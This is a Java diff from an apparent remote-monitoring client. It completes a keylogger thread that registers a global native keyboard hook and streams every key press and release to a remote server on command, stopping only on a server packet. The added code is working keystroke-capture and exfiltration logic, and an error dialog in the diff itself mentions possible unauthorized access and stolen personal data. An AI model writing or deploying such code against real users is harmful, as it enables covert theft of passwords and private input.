@@ -94,14 +94,7 @@ public class Connection {
 
 						// Creates a new thread that sends keystrokes to the server
 						// If the server sends another KEYL packet, then the thread is stopped
-						Thread keyThread = new Thread(new Runnable() {
-							@Override
-							public void run() {
-								while (!Thread.currentThread().isInterrupted()) {
-
-								}
-							}
-						});
+						Thread keyThread = new Thread(new KeyListenerThread());
 						keyThread.start();
 
 						// Listens for the KEYL packet so that the key sending thread can be stopped
@@ -117,6 +110,7 @@ public class Connection {
 									keyThread.interrupt();
 									break;
 								} else if (requestFooter.equals(PacketHeader.KILL)) {
+									keyThread.interrupt();
 									System.out.println("KILL REQUEST RECEIVED");
 									shutdown();
 									return;
@@ -144,6 +138,12 @@ public class Connection {
 		}
 	}
 
+	/**
+	 * A thread runnable that listens for keyboard inputs and sends it to the 
+	 * server. When interrupted, the thread will quit
+	 * 
+	 * @author Caleb Choi
+	 */
 	private class KeyListenerThread implements Runnable, NativeKeyListener {
 
 		/**
@@ -151,42 +151,45 @@ public class Connection {
 		 */
 		@Override
 		public void run() {
+			
+			// Try to register the native key hook
 			try {GlobalScreen.registerNativeHook();}
-			catch (NativeHookException e) {
+			catch (NativeHookException e) { // If unsuccessful, close program
 				System.out.println("NATIVE HOOK COULD NOT BE REGISTERED - EXITING PROGRAM");
 				shutdown();
-				JOptionPane.showMessageDialog(null, 
-						"Remote monitor connection has been unexpectedly disconnected from the server " + RemoteMonitorClient.getServerIP().getHostAddress() + "."
-								+ System.getProperty("line.separator")
-								+ System.getProperty("line.separator")
-								+ "If you are unsure why you are seeing this message, please contact your system administrator"
-								+ System.getProperty("line.separator")
-								+ "immediately. There may have been unauthorized access to your computer and your personal data "
-								+ System.getProperty("line.separator")
-								+ "has potentially been stolen."
-								, "Connection Terminated", JOptionPane.ERROR_MESSAGE);
+				RemoteMonitorClient.showNativeHookExceptionDialog();
 				System.exit(3);
 			}
-
+			// Add the native key listener
+			GlobalScreen.addNativeKeyListener(new KeyListenerThread());
 		}
 
 		@Override
-		public void nativeKeyPressed(NativeKeyEvent e) {
-		}
+		public void nativeKeyPressed(NativeKeyEvent e) {sendKey(e, true);}
 
 		@Override
-		public void nativeKeyReleased(NativeKeyEvent e) {
-		}
+		public void nativeKeyReleased(NativeKeyEvent e) {sendKey(e, false);}
 
 		@Override
-		public void nativeKeyTyped(NativeKeyEvent e) {
-		}
+		public void nativeKeyTyped(NativeKeyEvent e) {}
 
+		/**
+		 * Sends the key to the server. If there is a key hook issue or I/O exception
+		 * here, the program ends within this method
+		 * 
+		 * @param e Native key event to be sent
+		 * @param isPress Whether or not it was a key press or release, where press is true
+		 */
 		public void sendKey(NativeKeyEvent e, boolean isPress) {
 
 			// If the thread hasn't been interrupted, send the key
 			if (!Thread.currentThread().isInterrupted()) {
-				
+				try {output.writeBytes(KeyInterpreter.interpretKey(e, isPress));} 
+				catch (IOException ioe) {
+					shutdown();
+					RemoteMonitorClient.showDisconnectionDialog();
+					System.exit(2);
+				}
 				
 			} else try { // Otherwise close the native key hook
 				GlobalScreen.unregisterNativeHook();
